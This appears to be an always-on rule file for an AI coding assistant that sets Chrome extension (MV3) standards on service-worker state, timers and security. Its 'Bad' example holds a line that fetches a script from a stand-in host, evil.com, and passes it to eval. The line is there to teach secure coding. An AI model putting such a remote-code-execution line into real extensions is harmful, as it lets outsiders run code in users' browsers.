---
trigger: always_on
glob: "manifest.json,**/*.js"
description: "Chrome Extensions (MV3): Service Workers, Security, and Messaging."
---
# Chrome Extension Standards

## 1. Service Workers (MV3)

- **Persist**: Do NOT rely on global variables. Use `chrome.storage`.
- **Timers**: Use `chrome.alarms` instead of `setInterval`.

### Example: State

**Good**

```javascript
await chrome.storage.local.set({ count: 1 });
```

**Bad**

```javascript
let count = 0; // Resets when Service Worker goes idle
```

## 2. Security

- **Eval**: Never use `eval()` or `new Function()`.
- **Remote Code**: All logic must be bundled. No fetching JS from CDN.

### Example: Remote Code

**Good**

```javascript
import { func } from './utils.js';
```

**Bad**

```javascript
fetch('https://evil.com/script.js').then(eval); // Blocked by CWS
```
